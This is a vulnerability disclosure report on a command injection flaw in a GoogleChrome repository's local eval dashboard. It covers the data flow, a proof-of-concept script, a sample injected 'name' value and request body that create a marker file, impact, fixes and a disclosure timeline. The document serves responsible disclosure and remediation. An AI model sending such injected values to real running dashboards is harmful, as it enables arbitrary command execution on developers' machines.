# GoogleChrome modern-web-guidance-src: Cross-Origin Unauthenticated Command Injection in Local Eval Dashboard

## Summary

A command injection vulnerability exists in the GoogleChrome `modern-web-guidance-src` local evaluation dashboard flow.

The issue occurs because attacker-controlled input from the `/api/eval-launch` endpoint can reach a filesystem path. That path is later interpolated into a shell command executed with `execSync()`.

This affects the local developer/evaluation dashboard. It is not a Chrome browser vulnerability.

## Affected Vendor

Google

## Affected Product

GoogleChrome `modern-web-guidance-src`

Repository:

```text
https://github.com/GoogleChrome/modern-web-guidance-src
```

## Affected Version

Latest `main` branch / latest source archive tested on 2026-06-28.

## Vulnerability Class

CWE-78: OS Command Injection

## Affected Components

```text
eval-view/server.js
harness/run_suite.ts
harness/lib/agent-shared.ts
```

## Technical Details

The dashboard exposes a local eval launch endpoint:

```js
if (decodedPath === '/api/eval-launch' && req.method === 'POST') {
```

The endpoint accepts user-controlled JSON:

```js
const options = JSON.parse(body);
```

The attacker-controlled options are written to a temporary config file and then used to start an eval run:

```js
fs.writeFileSync(tempConfigPath, `export default ${JSON.stringify(options, null, 2)};`);

const p = spawn('pnpm', [
  'gd',
  'eval',
  '--config',
  tempConfigPath,
  '--no-ui',
  ...options.tasks
], ...)
```

The server also sets permissive CORS and Private Network Access headers:

```js
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Private-Network', 'true');
```

The attacker-controlled `options.name` is later used as the test ID and becomes part of the output directory path:

```ts
const testID = options.name || suiteConfig.name || `test-${timestamp}`;
const testDir = options.outputDir || path.join(resultsDir, testID);
```

The resulting path eventually reaches this shell command:

```ts
execSync(`cp -R "${sourceDir}/." "${targetDir}/"`);
```

Because `targetDir` contains attacker-controlled data and is embedded directly into a shell command, an attacker can inject a double quote and append arbitrary shell commands.

## Vulnerable Data Flow

```text
/api/eval-launch JSON body
  -> options.name
  -> testID
  -> testDir / targetDir
  -> execSync(`cp -R "${sourceDir}/." "${targetDir}/"`)
  -> shell command injection
```

## Proof of Concept

The following safe local proof of concept confirms the vulnerable shell command construction by creating a marker file in `/tmp`.

```bash
cat > confirm_mwg_cmdinj.sh <<'BASH'
#!/usr/bin/env bash
set -euo pipefail

ZIP="modern-web-guidance-src-main.zip"
DIR="modern-web-guidance-src-main"
MARKER="/tmp/mwg_cmdinj_confirmed_$$"

echo "[*] Cleaning old files..."
rm -rf "$DIR"
rm -f "$MARKER"

echo "[*] Extracting zip..."
unzip -q "$ZIP"

cd "$DIR"

echo "[*] Checking vulnerable code paths..."
grep -n "Access-Control-Allow-Origin.*\\*" eval-view/server.js
grep -n "Access-Control-Allow-Private-Network" eval-view/server.js
grep -n "/api/eval-launch" eval-view/server.js
grep -n "spawn('pnpm'" eval-view/server.js
grep -n 'execSync(`cp -R' harness/lib/agent-shared.ts

echo
echo "[*] Running safe local command-injection confirmation..."
node - "$MARKER" <<'NODE'
const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

const marker = process.argv[2];

const workDir = fs.mkdtempSync("/tmp/mwg-work-");
const sourceDir = path.join(workDir, "source");
fs.mkdirSync(sourceDir, { recursive: true });
fs.writeFileSync(path.join(sourceDir, "proof.txt"), "safe proof\n");

const attackerName = `poc"; touch ${marker}; #`;
const targetDir = path.join("/tmp/mwg-results", attackerName);

const cmd = `cp -R "${sourceDir}/." "${targetDir}/"`;

console.log("[*] Built command:");
console.log(cmd);

try {
  execSync(cmd, { shell: "/bin/sh", stdio: "pipe" });
} catch (e) {
  // cp may fail, but injected command can still execute
}

if (fs.existsSync(marker)) {
  console.log("\n[+] VULNERABLE CONFIRMED");
  console.log("[+] Marker created:", marker);
  process.exit(0);
}

console.log("\n[-] Not confirmed. Marker was not created.");
process.exit(1);
NODE

echo
echo "[*] Verify:"
ls -l "$MARKER"
BASH

chmod +x confirm_mwg_cmdinj.sh
./confirm_mwg_cmdinj.sh
```

Observed output:

```text
[*] Checking vulnerable code paths...
98:  res.setHeader('Access-Control-Allow-Origin', '*');
102:    res.setHeader('Access-Control-Allow-Private-Network', 'true');
242:  // --- /api/eval-launch : spawns an evaluation run in background ---
243:  if (decodedPath === '/api/eval-launch' && req.method === 'POST') {
262:        const p = spawn('pnpm', [
447:  execSync(`cp -R "${sourceDir}/." "${targetDir}/"`);

[*] Running safe local command-injection confirmation...
[*] Built command:
cp -R "/tmp/mwg-work-6PGueP/source/." "/tmp/mwg-results/poc"; touch /tmp/mwg_cmdinj_confirmed_16591; #/"

[+] VULNERABLE CONFIRMED
[+] Marker created: /tmp/mwg_cmdinj_confirmed_16591
```

## Attack Scenario

A realistic attack scenario is:

1. A developer or contributor runs the `modern-web-guidance-src` local eval dashboard.
2. An attacker causes the victim's browser to send a request to the local dashboard endpoint `/api/eval-launch`, or reaches the dashboard from the same local network.
3. The attacker supplies a malicious `name` value.
4. The value becomes part of the output directory path.
5. The path is later embedded into an `execSync()` shell command.
6. The injected shell command executes with the privileges of the user running the dashboard.

Example malicious value:

```text
poc"; touch /tmp/mwg_cmdinj_confirmed; #
```

Example request body:

```json
{
  "name": "poc\"; touch /tmp/mwg_cmdinj_confirmed; #",
  "numRuns": 1,
  "workerCount": 1,
  "agent": "gemini_cli",
  "serving": "skills_cli",
  "skillsToEnable": ["modern-web-guidance"],
  "tasks": ["autofill-address-form/task"]
}
```

## Impact

An attacker who can reach the local evaluation dashboard while it is running may execute arbitrary shell commands on the developer machine.

Potential impact includes:

- Reading or modifying local project files
- Executing arbitrary user-level commands
- Accessing local secrets available to the dashboard process, such as environment variables, API keys, auth tokens, or AI provider credentials
- Modifying evaluation outputs or local repository state
- Consuming local AI/API quota through the eval runner
- Using the compromised developer environment as a starting point for further attacks

This is a local developer-tool RCE class issue. It does not directly affect normal Chrome browser users.

## Severity

Suggested severity: High for affected developer environments.

Suggested CVSS 3.1 vector:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
```

Suggested score: 9.6

Note: The final score may be lower depending on the triager's treatment of localhost-only developer tools and required user interaction.

## Recommended Fix

Avoid shell interpolation for filesystem copy operations.

Replace:

```ts
execSync(`cp -R "${sourceDir}/." "${targetDir}/"`);
```

with a non-shell filesystem API:

```ts
fs.cpSync(sourceDir, targetDir, {
  recursive: true,
  force: true
});
```

Also validate `options.name` strictly:

```text
^[a-zA-Z0-9_.-]{1,80}$
```

Additional hardening:

- Require a per-session random token for `/api/eval-launch`
- Remove permissive `Access-Control-Allow-Origin: *`
- Remove `Access-Control-Allow-Private-Network: true` unless absolutely required
- Verify `Origin` and `Host`
- Bind the dashboard explicitly to localhost:

```js
server.listen(PORT, "127.0.0.1");
```

## Disclosure Timeline

```text
2026-06-28: Vulnerability discovered and confirmed locally.
2026-06-28: Report submitted to Google OSS VRP.
2026-06-28: Google IssueTracker ID 529154657 created.
2026-06-28: Google closed the VRP ticket as not reward-eligible for OSS VRP monetary reward because the repository falls into OT2/OT3 tier. Google suggested opening an issue or pull request directly on GitHub.
```

## References

```text
Google IssueTracker: 529154657
Repository: https://github.com/GoogleChrome/modern-web-guidance-src
CWE-78: OS Command Injection
```
